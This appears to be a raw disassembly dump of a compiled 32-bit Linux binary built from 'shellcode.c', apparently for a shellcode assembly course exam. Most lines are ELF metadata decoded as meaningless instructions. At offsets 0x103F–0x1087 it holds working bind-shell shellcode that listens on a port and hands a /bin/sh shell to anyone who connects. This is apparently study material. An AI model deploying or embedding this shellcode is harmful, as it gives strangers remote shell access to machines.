00000000  7F45              jg 0x47
00000EFE  0000              add [eax],al
00000F00  0000              add [eax],al
00000F02  0000              add [eax],al
00000F04  0000              add [eax],al
00000F06  0000              add [eax],al
00000F08  0000              add [eax],al
00000F0A  0000              add [eax],al
00000F0C  0000              add [eax],al
00000F0E  0000              add [eax],al
00000F10  0000              add [eax],al
00000F12  0000              add [eax],al
00000F14  FF                db 0xff
00000F15  FF                db 0xff
00000F16  FF                db 0xff
00000F17  FF00              inc dword [eax]
00000F19  0000              add [eax],al
00000F1B  00FF              add bh,bh
00000F1D  FF                db 0xff
00000F1E  FF                db 0xff
00000F1F  FF00              inc dword [eax]
00000F21  0000              add [eax],al
00000F23  0000              add [eax],al
00000F25  0000              add [eax],al
00000F27  0001              add [ecx],al
00000F29  0000              add [eax],al
00000F2B  0010              add [eax],dl
00000F2D  0000              add [eax],al
00000F2F  000C00            add [eax+eax],cl
00000F32  0000              add [eax],al
00000F34  B482              mov ah,0x82
00000F36  0408              add al,0x8
00000F38  0D000000EC        or eax,0xec000000
00000F3D  840408            test [eax+ecx],al
00000F40  F5                cmc
00000F41  FE                db 0xfe
00000F42  FF6FAC            jmp dword far [edi-0x54]
00000F45  81040805000000    add dword [eax+ecx],0x5
00000F4C  1C82              sbb al,0x82
00000F4E  0408              add al,0x8
00000F50  06                push es
00000F51  0000              add [eax],al
00000F53  00CC              add ah,cl
00000F55  8104080A000000    add dword [eax+ecx],0xa
00000F5C  4C                dec esp
00000F5D  0000              add [eax],al
00000F5F  000B              add [ebx],cl
00000F61  0000              add [eax],al
00000F63  0010              add [eax],dl
00000F65  0000              add [eax],al
00000F67  001500000000      add [dword 0x0],dl
00000F6D  0000              add [eax],al
00000F6F  0003              add [ebx],al
00000F71  0000              add [eax],al
00000F73  00F4              add ah,dh
00000F75  9F                lahf
00000F76  0408              add al,0x8
00000F78  0200              add al,[eax]
00000F7A  0000              add [eax],al
00000F7C  1800              sbb [eax],al
00000F7E  0000              add [eax],al
00000F80  1400              adc al,0x0
00000F82  0000              add [eax],al
00000F84  1100              adc [eax],eax
00000F86  0000              add [eax],al
00000F88  17                pop ss
00000F89  0000              add [eax],al
00000F8B  009C8204081100    add [edx+eax*4+0x110804],bl
00000F92  0000              add [eax],al
00000F94  94                xchg eax,esp
00000F95  82                db 0x82
00000F96  0408              add al,0x8
00000F98  1200              adc al,[eax]
00000F9A  0000              add [eax],al
00000F9C  0800              or [eax],al
00000F9E  0000              add [eax],al
00000FA0  1300              adc eax,[eax]
00000FA2  0000              add [eax],al
00000FA4  0800              or [eax],al
00000FA6  0000              add [eax],al
00000FA8  FE                db 0xfe
00000FA9  FF                db 0xff
00000FAA  FF6F74            jmp dword far [edi+0x74]
00000FAD  82                db 0x82
00000FAE  0408              add al,0x8
00000FB0  FF                db 0xff
00000FB1  FF                db 0xff
00000FB2  FF6F01            jmp dword far [edi+0x1]
00000FB5  0000              add [eax],al
00000FB7  00F0              add al,dh
00000FB9  FF                db 0xff
00000FBA  FF6F68            jmp dword far [edi+0x68]
00000FBD  82                db 0x82
00000FBE  0408              add al,0x8
00000FC0  0000              add [eax],al
00000FC2  0000              add [eax],al
00000FC4  0000              add [eax],al
00000FC6  0000              add [eax],al
00000FC8  0000              add [eax],al
00000FCA  0000              add [eax],al
00000FCC  0000              add [eax],al
00000FCE  0000              add [eax],al
00000FD0  0000              add [eax],al
00000FD2  0000              add [eax],al
00000FD4  0000              add [eax],al
00000FD6  0000              add [eax],al
00000FD8  0000              add [eax],al
00000FDA  0000              add [eax],al
00000FDC  0000              add [eax],al
00000FDE  0000              add [eax],al
00000FE0  0000              add [eax],al
00000FE2  0000              add [eax],al
00000FE4  0000              add [eax],al
00000FE6  0000              add [eax],al
00000FE8  0000              add [eax],al
00000FEA  0000              add [eax],al
00000FEC  0000              add [eax],al
00000FEE  0000              add [eax],al
00000FF0  0000              add [eax],al
00000FF2  0000              add [eax],al
00000FF4  289F04080000      sub [edi+0x804],bl
00000FFA  0000              add [eax],al
00000FFC  0000              add [eax],al
00000FFE  0000              add [eax],al
00001000  06                push es
00001001  83040816          add dword [eax+ecx],byte +0x16
00001005  83040826          add dword [eax+ecx],byte +0x26
00001009  83040800          add dword [eax+ecx],byte +0x0
0000100D  0000              add [eax],al
0000100F  0000              add [eax],al
00001011  0000              add [eax],al
00001013  0000              add [eax],al
00001015  0000              add [eax],al
00001017  0000              add [eax],al
00001019  0000              add [eax],al
0000101B  0000              add [eax],al
0000101D  0000              add [eax],al
0000101F  0000              add [eax],al
00001021  0000              add [eax],al
00001023  0000              add [eax],al
00001025  0000              add [eax],al
00001027  0000              add [eax],al
00001029  0000              add [eax],al
0000102B  0000              add [eax],al
0000102D  0000              add [eax],al
0000102F  0000              add [eax],al
00001031  0000              add [eax],al
00001033  0000              add [eax],al
00001035  0000              add [eax],al
00001037  0000              add [eax],al
00001039  0000              add [eax],al
0000103B  0000              add [eax],al
0000103D  0000              add [eax],al
0000103F  0031              add [ecx],dh
00001041  DBF7              fcomi st7
00001043  E3B0              jecxz 0xff5
00001045  6643              inc bx
00001047  52                push edx
00001048  53                push ebx
00001049  6A02              push byte +0x2
0000104B  89E1              mov ecx,esp
0000104D  CD80              int 0x80
0000104F  5B                pop ebx
00001050  5E                pop esi
00001051  52                push edx
00001052  66682B67          push word 0x672b
00001056  6A10              push byte +0x10
00001058  51                push ecx
00001059  50                push eax
0000105A  B066              mov al,0x66
0000105C  89E1              mov ecx,esp
0000105E  CD80              int 0x80
00001060  895104            mov [ecx+0x4],edx
00001063  B066              mov al,0x66
00001065  B304              mov bl,0x4
00001067  CD80              int 0x80
00001069  B066              mov al,0x66
0000106B  43                inc ebx
0000106C  CD80              int 0x80
0000106E  59                pop ecx
0000106F  93                xchg eax,ebx
00001070  6A3F              push byte +0x3f
00001072  58                pop eax
00001073  CD80              int 0x80
00001075  49                dec ecx
00001076  79F8              jns 0x1070
00001078  B00B              mov al,0xb
0000107A  682F2F7368        push dword 0x68732f2f
0000107F  682F62696E        push dword 0x6e69622f
00001084  89E3              mov ebx,esp
00001086  41                inc ecx
00001087  CD80              int 0x80
00001089  0000              add [eax],al
0000108B  004743            add [edi+0x43],al
0000108E  43                inc ebx
0000108F  3A20              cmp ah,[eax]
00001091  285562            sub [ebp+0x62],dl
00001094  756E              jnz 0x1104
00001096  7475              jz 0x110d
00001098  2F                das
00001099  4C                dec esp
0000109A  696E61726F2034    imul ebp,[esi+0x61],dword 0x34206f72
000010A1  2E362E332D317562  xor ebp,[dword cs:0x75627531]
         -75
000010AA  6E                outsb
000010AB  7475              jz 0x1122
000010AD  352920342E        xor eax,0x2e342029
000010B2  362E3300          xor eax,[cs:eax]
000010B6  1C00              sbb al,0x0
000010B8  0000              add [eax],al
000010BA  0200              add al,[eax]
000010BC  0000              add [eax],al
000010BE  0000              add [eax],al
000010C0  0400              add al,0x0
000010C2  0000              add [eax],al
000010C4  0000              add [eax],al
000010C6  E483              in al,0x83
000010C8  0408              add al,0x8
000010CA  51                push ecx
000010CB  0000              add [eax],al
000010CD  0000              add [eax],al
000010CF  0000              add [eax],al
000010D1  0000              add [eax],al
000010D3  0000              add [eax],al
000010D5  00CD              add ch,cl
000010D7  0000              add [eax],al
000010D9  0002              add [edx],al
000010DB  0000              add [eax],al
000010DD  0000              add [eax],al
000010DF  000401            add [ecx+eax],al
000010E2  660000            o16 add [eax],al
000010E5  0001              add [ecx],al
000010E7  7200              jc 0x10e9
000010E9  0000              add [eax],al
000010EB  2100              and [eax],eax
000010ED  0000              add [eax],al
000010EF  E483              in al,0x83
000010F1  0408              add al,0x8
000010F3  3584040800        xor eax,0x80484
000010F8  0000              add [eax],al
000010FA  0002              add [edx],al
000010FC  0407              add al,0x7
000010FE  46                inc esi
000010FF  0000              add [eax],al
00001101  0002              add [edx],al
00001103  0108              add [eax],ecx
00001105  53                push ebx
00001106  0000              add [eax],al
00001108  0002              add [edx],al
0000110A  0207              add al,[edi]
0000110C  0E                push cs
0000110D  0000              add [eax],al
0000110F  0002              add [edx],al
00001111  0407              add al,0x7
00001113  41                inc ecx
00001114  0000              add [eax],al
00001116  0002              add [edx],al
00001118  0106              add [esi],eax
0000111A  55                push ebp
0000111B  0000              add [eax],al
0000111D  0002              add [edx],al
0000111F  020583000000      add al,[dword 0x83]
00001125  030405696E7400    add eax,[eax+0x746e69]
0000112C  0208              add cl,[eax]
0000112E  0500000000        add eax,0x0
00001133  0208              add cl,[eax]
00001135  07                pop es
00001136  3C00              cmp al,0x0
00001138  0000              add [eax],al
0000113A  02040505000000    add al,[eax+0x5]
00001141  0201              add al,[ecx]
00001143  06                push es
00001144  5C                pop esp
00001145  0000              add [eax],al
00001147  000401            add [ecx+eax],al
0000114A  61                popad
0000114B  0000              add [eax],al
0000114D  0001              add [ecx],al
0000114F  144F              adc al,0x4f
00001151  0000              add [eax],al
00001153  00E4              add ah,ah
00001155  83040835          add dword [eax+ecx],byte +0x35
00001159  840408            test [eax+ecx],al
0000115C  0000              add [eax],al
0000115E  0000              add [eax],al
00001160  9D                popfd
00001161  0000              add [eax],al
00001163  000572657400      add [dword 0x746572],al
00001169  0119              add [ecx],ebx
0000116B  A800              test al,0x0
0000116D  0000              add [eax],al
0000116F  02742C00          add dh,[esp+ebp+0x0]
00001173  06                push es
00001174  4F                dec edi
00001175  0000              add [eax],al
00001177  00A800000007      add [eax+0x7000000],ch
0000117D  0008              add [eax],cl
0000117F  049D              add al,0x9d
00001181  0000              add [eax],al
00001183  0009              add [ecx],cl
00001185  2C00              sub al,0x0
00001187  0000              add [eax],al
00001189  BE0000000A        mov esi,0xa000000
0000118E  2500000049        and eax,0x49000000
00001193  000B              add [ebx],cl
00001195  7E00              jng 0x1197
00001197  0000              add [eax],al
00001199  0104AE            add [esi+ebp*4],eax
0000119C  0000              add [eax],al
0000119E  0001              add [ecx],al
000011A0  050340A004        add eax,0x4a04003
000011A5  0800              or [eax],al
000011A7  0111              add [ecx],edx
000011A9  01250E130B03      add [dword 0x30b130e],esp
000011AF  0E                push cs
000011B0  1B0E              sbb ecx,[esi]
000011B2  1101              adc [ecx],eax
000011B4  1201              adc al,[ecx]
000011B6  1006              adc [esi],al
000011B8  0000              add [eax],al
000011BA  022400            add ah,[eax+eax]
000011BD  0B0B              or ecx,[ebx]
000011BF  3E0B03            or eax,[ds:ebx]
000011C2  0E                push cs
000011C3  0000              add [eax],al
000011C5  032400            add esp,[eax+eax]
000011C8  0B0B              or ecx,[ebx]
000011CA  3E0B03            or eax,[ds:ebx]
000011CD  0800              or [eax],al
000011CF  00042E            add [esi+ebp],al
000011D2  013F              add [edi],edi
000011D4  0C03              or al,0x3
000011D6  0E                push cs
000011D7  3A0B              cmp cl,[ebx]
000011D9  3B0B              cmp ecx,[ebx]
000011DB  49                dec ecx
000011DC  1311              adc edx,[ecx]
000011DE  0112              add [edx],edx
000011E0  014006            add [eax+0x6],eax
000011E3  0113              add [ebx],edx
000011E5  0000              add [eax],al
000011E7  0534000308        add eax,0x8030034
000011EC  3A0B              cmp cl,[ebx]
000011EE  3B0B              cmp ecx,[ebx]
000011F0  49                dec ecx
000011F1  1302              adc eax,[edx]
000011F3  0A00              or al,[eax]
000011F5  0006              add [esi],al
000011F7  1501491301        adc eax,0x1134901
000011FC  1300              adc eax,[eax]
000011FE  0007              add [edi],al
00001200  1800              sbb [eax],al
00001202  0000              add [eax],al
00001204  080F              or [edi],cl
00001206  000B              add [ebx],cl
00001208  0B4913            or ecx,[ecx+0x13]
0000120B  0000              add [eax],al
0000120D  0901              or [ecx],eax
0000120F  014913            add [ecx+0x13],ecx
00001212  0113              add [ebx],edx
00001214  0000              add [eax],al
00001216  0A21              or ah,[ecx]
00001218  004913            add [ecx+0x13],cl
0000121B  2F                das
0000121C  0B00              or eax,[eax]
0000121E  000B              add [ebx],cl
00001220  3400              xor al,0x0
00001222  030E              add ecx,[esi]
00001224  3A0B              cmp cl,[ebx]
00001226  3B0B              cmp ecx,[ebx]
00001228  49                dec ecx
00001229  133F              adc edi,[edi]
0000122B  0C02              or al,0x2
0000122D  0A00              or al,[eax]
0000122F  0000              add [eax],al
00001231  3D00000002        cmp eax,0x2000000
00001236  0022              add [edx],ah
00001238  0000              add [eax],al
0000123A  0001              add [ecx],al
0000123C  01FB              add ebx,edi
0000123E  0E                push cs
0000123F  0D00010101        or eax,0x1010100
00001244  0100              add [eax],eax
00001246  0000              add [eax],al
00001248  0100              add [eax],eax
0000124A  0001              add [ecx],al
0000124C  007368            add [ebx+0x68],dh
0000124F  656C              gs insb
00001251  6C                insb
00001252  636F64            arpl [edi+0x64],bp
00001255  652E6300          arpl [cs:eax],ax
00001259  0000              add [eax],al
0000125B  0000              add [eax],al
0000125D  000502E48304      add [dword 0x483e402],al
00001263  0803              or [ebx],al
00001265  1401              adc al,0x1
00001267  A002341484        mov al,[0x84143402]
0000126C  6802050001        push dword 0x1000502
00001271  016C6F6E          add [edi+ebp*2+0x6e],ebp
00001275  67206C6F          and [si+0x6f],ch
00001279  6E                outsb
0000127A  6720696E          and [bx+di+0x6e],ch
0000127E  7400              jz 0x1280
00001280  7368              jnc 0x12ea
00001282  6F                outsd
00001283  7274              jc 0x12f9
00001285  20756E            and [ebp+0x6e],dh
00001288  7369              jnc 0x12f3
0000128A  676E              a16 outsb
0000128C  656420696E        and [fs:ecx+0x6e],ch
00001291  7400              jz 0x1293
00001293  2F                das
00001294  686F6D652F        push dword 0x2f656d6f
00001299  6A6F              push byte +0x6f
0000129B  686E2F534C        push dword 0x4c532f6e
000012A0  41                inc ecx
000012A1  45                inc ebp
000012A2  2F                das
000012A3  657861            gs js 0x1307
000012A6  6D                insd
000012A7  2F                das
000012A8  7461              jz 0x130b
000012AA  736B              jnc 0x1317
000012AC  35006C6F6E        xor eax,0x6e6f6c00
000012B1  67206C6F          and [si+0x6f],ch
000012B5  6E                outsb
000012B6  6720756E          and [di+0x6e],dh
000012BA  7369              jnc 0x1325
000012BC  676E              a16 outsb
000012BE  656420696E        and [fs:ecx+0x6e],ch
000012C3  7400              jz 0x12c5
000012C5  756E              jnz 0x1335
000012C7  7369              jnc 0x1332
000012C9  676E              a16 outsb
000012CB  6564206368        and [fs:ebx+0x68],ah
000012D0  61                popad
000012D1  7200              jc 0x12d3
000012D3  6D                insd
000012D4  61                popad
000012D5  696E00474E5520    imul ebp,[esi+0x0],dword 0x20554e47
000012DC  43                inc ebx
000012DD  20342E            and [esi+ebp],dh
000012E0  362E3300          xor eax,[cs:eax]
000012E4  7368              jnc 0x134e
000012E6  656C              gs insb
000012E8  6C                insb
000012E9  636F64            arpl [edi+0x64],bp
000012EC  652E6300          arpl [cs:eax],ax
000012F0  636F64            arpl [edi+0x64],bp
000012F3  65007368          add [gs:ebx+0x68],dh
000012F7  6F                outsd
000012F8  7274              jc 0x136e
000012FA  20696E            and [ecx+0x6e],ch
000012FD  7400              jz 0x12ff
000012FF  0000              add [eax],al
00001301  0000              add [eax],al
00001303  0100              add [eax],eax
00001305  0000              add [eax],al
00001307  0200              add al,[eax]
00001309  7404              jz 0x130f
0000130B  0100              add [eax],eax
0000130D  0000              add [eax],al
0000130F  0300              add eax,[eax]
00001311  0000              add [eax],al
00001313  0200              add al,[eax]
00001315  7408              jz 0x131f
00001317  0300              add eax,[eax]
00001319  0000              add [eax],al
0000131B  50                push eax
0000131C  0000              add [eax],al
0000131E  0002              add [edx],al
00001320  007508            add [ebp+0x8],dh
00001323  50                push eax
00001324  0000              add [eax],al
00001326  005100            add [ecx+0x0],dl
00001329  0000              add [eax],al
0000132B  0200              add al,[eax]
0000132D  7404              jz 0x1333
0000132F  0000              add [eax],al
00001331  0000              add [eax],al
00001333  0000              add [eax],al
00001335  0000              add [eax],al
00001337  002E              add [esi],ch
00001339  7379              jnc 0x13b4
0000133B  6D                insd
0000133C  7461              jz 0x139f
0000133E  6200              bound eax,[eax]
00001340  2E7374            cs jnc 0x13b7
00001343  7274              jc 0x13b9
00001345  61                popad
00001346  6200              bound eax,[eax]
00001348  2E7368            cs jnc 0x13b3
0000134B  7374              jnc 0x13c1
0000134D  7274              jc 0x13c3
0000134F  61                popad
00001350  6200              bound eax,[eax]
00001352  2E696E7465727000  imul ebp,[cs:esi+0x74],dword 0x707265
0000135A  2E6E              cs outsb
0000135C  6F                outsd
0000135D  7465              jz 0x13c4
0000135F  2E41              cs inc ecx
00001361  42                inc edx
00001362  49                dec ecx
00001363  2D74616700        sub eax,0x676174
00001368  2E6E              cs outsb
0000136A  6F                outsd
0000136B  7465              jz 0x13d2
0000136D  2E676E            cs a16 outsb
00001370  752E              jnz 0x13a0
00001372  627569            bound esi,[ebp+0x69]
00001375  6C                insb
00001376  642D6964002E      fs sub eax,0x2e006469
0000137C  676E              a16 outsb
0000137E  752E              jnz 0x13ae
00001380  6861736800        push dword 0x687361
00001385  2E64796E          fs jns 0x13f7
00001389  7379              jnc 0x1404
0000138B  6D                insd
0000138C  002E              add [esi],ch
0000138E  64796E            fs jns 0x13ff
00001391  7374              jnc 0x1407
00001393  7200              jc 0x1395
00001395  2E676E            cs a16 outsb
00001398  752E              jnz 0x13c8
0000139A  7665              jna 0x1401
0000139C  7273              jc 0x1411
0000139E  696F6E002E676E    imul ebp,[edi+0x6e],dword 0x6e672e00
000013A5  752E              jnz 0x13d5
000013A7  7665              jna 0x140e
000013A9  7273              jc 0x141e
000013AB  696F6E5F72002E    imul ebp,[edi+0x6e],dword 0x2e00725f
000013B2  7265              jc 0x1419
000013B4  6C                insb
000013B5  2E64796E          fs jns 0x1427
000013B9  002E              add [esi],ch
000013BB  7265              jc 0x1422
000013BD  6C                insb
000013BE  2E706C            cs jo 0x142d
000013C1  7400              jz 0x13c3
000013C3  2E696E6974002E74  imul ebp,[cs:esi+0x69],dword 0x742e0074
000013CB  657874            gs js 0x1442
000013CE  002E              add [esi],ch
000013D0  66696E69002E      imul bp,[esi+0x69],word 0x2e00
000013D6  726F              jc 0x1447
000013D8  6461              fs popad
000013DA  7461              jz 0x143d
000013DC  002E              add [esi],ch
000013DE  65685F667261      gs push dword 0x6172665f
000013E4  6D                insd
000013E5  655F              gs pop edi
000013E7  686472002E        push dword 0x2e007264
000013EC  65685F667261      gs push dword 0x6172665f
000013F2  6D                insd
000013F3  65002E            add [gs:esi],ch
000013F6  63746F72          arpl [edi+ebp*2+0x72],si
000013FA  7300              jnc 0x13fc
000013FC  2E64746F          fs jz 0x146f
00001400  7273              jc 0x1475
00001402  002E              add [esi],ch
00001404  6A63              push byte +0x63
00001406  7200              jc 0x1408
00001408  2E64796E          fs jns 0x147a
0000140C  61                popad
0000140D  6D                insd
0000140E  6963002E676F74    imul esp,[ebx+0x0],dword 0x746f672e
00001415  002E              add [esi],ch
00001417  676F              a16 outsd
00001419  742E              jz 0x1449
0000141B  706C              jo 0x1489
0000141D  7400              jz 0x141f
0000141F  2E6461            fs popad
00001422  7461              jz 0x1485
00001424  002E              add [esi],ch
00001426  627373            bound esi,[ebx+0x73]
00001429  002E              add [esi],ch
0000142B  636F6D            arpl [edi+0x6d],bp
0000142E  6D                insd
0000142F  656E              gs outsb
00001431  7400              jz 0x1433
00001433  2E6465627567      bound esi,[gs:ebp+0x67]
00001439  5F                pop edi
0000143A  61                popad
0000143B  7261              jc 0x149e
0000143D  6E                outsb
0000143E  67657300          gs jnc 0x1442
00001442  2E6465627567      bound esi,[gs:ebp+0x67]
00001448  5F                pop edi
00001449  696E666F002E64    imul ebp,[esi+0x66],dword 0x642e006f
00001450  65627567          bound esi,[gs:ebp+0x67]
00001454  5F                pop edi
00001455  61                popad
00001456  626272            bound esp,[edx+0x72]
00001459  657600            gs jna 0x145c
0000145C  2E6465627567      bound esi,[gs:ebp+0x67]
00001462  5F                pop edi
00001463  6C                insb
00001464  696E65002E6465    imul ebp,[esi+0x65],dword 0x65642e00
0000146B  627567            bound esi,[ebp+0x67]
0000146E  5F                pop edi
0000146F  7374              jnc 0x14e5
00001471  7200              jc 0x1473
00001473  2E6465627567      bound esi,[gs:ebp+0x67]
00001479  5F                pop edi
0000147A  6C                insb
0000147B  6F                outsd
0000147C  6300              arpl [eax],ax
0000147E  0000              add [eax],al
00001480  0000              add [eax],al
00001482  0000              add [eax],al
00001484  0000              add [eax],al
00001486  0000              add [eax],al
00001488  0000              add [eax],al
0000148A  0000              add [eax],al
0000148C  0000              add [eax],al
0000148E  0000              add [eax],al
00001490  0000              add [eax],al
00001492  0000              add [eax],al
00001494  0000              add [eax],al
00001496  0000              add [eax],al
00001498  0000              add [eax],al
0000149A  0000              add [eax],al
0000149C  0000              add [eax],al
0000149E  0000              add [eax],al
000014A0  0000              add [eax],al
000014A2  0000              add [eax],al
000014A4  0000              add [eax],al
000014A6  0000              add [eax],al
000014A8  1B00              sbb eax,[eax]
000014AA  0000              add [eax],al
000014AC  0100              add [eax],eax
000014AE  0000              add [eax],al
000014B0  0200              add al,[eax]
000014B2  0000              add [eax],al
000014B4  54                push esp
000014B5  81040854010000    add dword [eax+ecx],0x154
000014BC  1300              adc eax,[eax]
000014BE  0000              add [eax],al
000014C0  0000              add [eax],al
000014C2  0000              add [eax],al
000014C4  0000              add [eax],al
000014C6  0000              add [eax],al
000014C8  0100              add [eax],eax
000014CA  0000              add [eax],al
000014CC  0000              add [eax],al
000014CE  0000              add [eax],al
000014D0  2300              and eax,[eax]
000014D2  0000              add [eax],al
000014D4  07                pop es
000014D5  0000              add [eax],al
000014D7  0002              add [edx],al
000014D9  0000              add [eax],al
000014DB  006881            add [eax-0x7f],ch
000014DE  0408              add al,0x8
000014E0  6801000020        push dword 0x20000001
000014E5  0000              add [eax],al
000014E7  0000              add [eax],al
000014E9  0000              add [eax],al
000014EB  0000              add [eax],al
000014ED  0000              add [eax],al
000014EF  000400            add [eax+eax],al
000014F2  0000              add [eax],al
000014F4  0000              add [eax],al
000014F6  0000              add [eax],al
000014F8  3100              xor [eax],eax
000014FA  0000              add [eax],al
000014FC  07                pop es
000014FD  0000              add [eax],al
000014FF  0002              add [edx],al
00001501  0000              add [eax],al
00001503  008881040888      add [eax-0x77f7fb7f],cl
00001509  0100              add [eax],eax
0000150B  002400            add [eax+eax],ah
0000150E  0000              add [eax],al
00001510  0000              add [eax],al
00001512  0000              add [eax],al
00001514  0000              add [eax],al
00001516  0000              add [eax],al
00001518  0400              add al,0x0
0000151A  0000              add [eax],al
0000151C  0000              add [eax],al
0000151E  0000              add [eax],al
00001520  44                inc esp
00001521  0000              add [eax],al
00001523  00F6              add dh,dh
00001525  FF                db 0xff
00001526  FF6F02            jmp dword far [edi+0x2]
00001529  0000              add [eax],al
0000152B  00AC810408AC01    add [ecx+eax*4+0x1ac0804],ch
00001532  0000              add [eax],al
00001534  2000              and [eax],al
00001536  0000              add [eax],al
00001538  0500000000        add eax,0x0
0000153D  0000              add [eax],al
0000153F  000400            add [eax+eax],al
00001542  0000              add [eax],al
00001544  0400              add al,0x0
00001546  0000              add [eax],al
00001548  4E                dec esi
00001549  0000              add [eax],al
0000154B  000B              add [ebx],cl
0000154D  0000              add [eax],al
0000154F  0002              add [edx],al
00001551  0000              add [eax],al
00001553  00CC              add ah,cl
00001555  810408CC010000    add dword [eax+ecx],0x1cc
0000155C  50                push eax
0000155D  0000              add [eax],al
0000155F  0006              add [esi],al
00001561  0000              add [eax],al
00001563  0001              add [ecx],al
00001565  0000              add [eax],al
00001567  000400            add [eax+eax],al
0000156A  0000              add [eax],al
0000156C  1000              adc [eax],al
0000156E  0000              add [eax],al
00001570  56                push esi
00001571  0000              add [eax],al
00001573  0003              add [ebx],al
00001575  0000              add [eax],al
00001577  0002              add [edx],al
00001579  0000              add [eax],al
0000157B  001C82            add [edx+eax*4],bl
0000157E  0408              add al,0x8
00001580  1C02              sbb al,0x2
00001582  0000              add [eax],al
00001584  4C                dec esp
00001585  0000              add [eax],al
00001587  0000              add [eax],al
00001589  0000              add [eax],al
0000158B  0000              add [eax],al
0000158D  0000              add [eax],al
0000158F  0001              add [ecx],al
00001591  0000              add [eax],al
00001593  0000              add [eax],al
00001595  0000              add [eax],al
00001597  005E00            add [esi+0x0],bl
0000159A  0000              add [eax],al
0000159C  FF                db 0xff
0000159D  FF                db 0xff
0000159E  FF6F02            jmp dword far [edi+0x2]
000015A1  0000              add [eax],al
000015A3  006882            add [eax-0x7e],ch
000015A6  0408              add al,0x8
000015A8  680200000A        push dword 0xa000002
000015AD  0000              add [eax],al
000015AF  000500000000      add [dword 0x0],al
000015B5  0000              add [eax],al
000015B7  0002              add [edx],al
000015B9  0000              add [eax],al
000015BB  0002              add [edx],al
000015BD  0000              add [eax],al
000015BF  006B00            add [ebx+0x0],ch
000015C2  0000              add [eax],al
000015C4  FE                db 0xfe
000015C5  FF                db 0xff
000015C6  FF6F02            jmp dword far [edi+0x2]
000015C9  0000              add [eax],al
000015CB  00748204          add [edx+eax*4+0x4],dh
000015CF  08740200          or [edx+eax+0x0],dh
000015D3  0020              add [eax],ah
000015D5  0000              add [eax],al
000015D7  0006              add [esi],al
000015D9  0000              add [eax],al
000015DB  0001              add [ecx],al
000015DD  0000              add [eax],al
000015DF  000400            add [eax+eax],al
000015E2  0000              add [eax],al
000015E4  0000              add [eax],al
000015E6  0000              add [eax],al
000015E8  7A00              jpe 0x15ea
000015EA  0000              add [eax],al
000015EC  0900              or [eax],eax
000015EE  0000              add [eax],al
000015F0  0200              add al,[eax]
000015F2  0000              add [eax],al
000015F4  94                xchg eax,esp
000015F5  82                db 0x82
000015F6  0408              add al,0x8
000015F8  94                xchg eax,esp
000015F9  0200              add al,[eax]
000015FB  0008              add [eax],cl
000015FD  0000              add [eax],al
000015FF  000500000000      add [dword 0x0],al
00001605  0000              add [eax],al
00001607  000400            add [eax+eax],al
0000160A  0000              add [eax],al
0000160C  0800              or [eax],al
0000160E  0000              add [eax],al
00001610  830000            add dword [eax],byte +0x0
00001613  0009              add [ecx],cl
00001615  0000              add [eax],al
00001617  0002              add [edx],al
00001619  0000              add [eax],al
0000161B  009C8204089C02    add [edx+eax*4+0x29c0804],bl
00001622  0000              add [eax],al
00001624  1800              sbb [eax],al
00001626  0000              add [eax],al
00001628  050000000C        add eax,0xc000000
0000162D  0000              add [eax],al
0000162F  000400            add [eax+eax],al
00001632  0000              add [eax],al
00001634  0800              or [eax],al
00001636  0000              add [eax],al
00001638  8C00              mov [eax],es
0000163A  0000              add [eax],al
0000163C  0100              add [eax],eax
0000163E  0000              add [eax],al
00001640  06                push es
00001641  0000              add [eax],al
00001643  00B4820408B402    add [edx+eax*4+0x2b40804],dh
0000164A  0000              add [eax],al
0000164C  2E0000            add [cs:eax],al
0000164F  0000              add [eax],al
00001651  0000              add [eax],al
00001653  0000              add [eax],al
00001655  0000              add [eax],al
00001657  000400            add [eax+eax],al
0000165A  0000              add [eax],al
0000165C  0000              add [eax],al
0000165E  0000              add [eax],al
00001660  8700              xchg eax,[eax]
00001662  0000              add [eax],al
00001664  0100              add [eax],eax
00001666  0000              add [eax],al
00001668  06                push es
00001669  0000              add [eax],al
0000166B  00F0              add al,dh
0000166D  82                db 0x82
0000166E  0408              add al,0x8
00001670  F00200            lock add al,[eax]
00001673  004000            add [eax+0x0],al
00001676  0000              add [eax],al
00001678  0000              add [eax],al
0000167A  0000              add [eax],al
0000167C  0000              add [eax],al
0000167E  0000              add [eax],al
00001680  1000              adc [eax],al
00001682  0000              add [eax],al
00001684  0400              add al,0x0
00001686  0000              add [eax],al
00001688  92                xchg eax,edx
00001689  0000              add [eax],al
0000168B  0001              add [ecx],al
0000168D  0000              add [eax],al
0000168F  0006              add [esi],al
00001691  0000              add [eax],al
00001693  0030              add [eax],dh
00001695  83040830          add dword [eax+ecx],byte +0x30
00001699  0300              add eax,[eax]
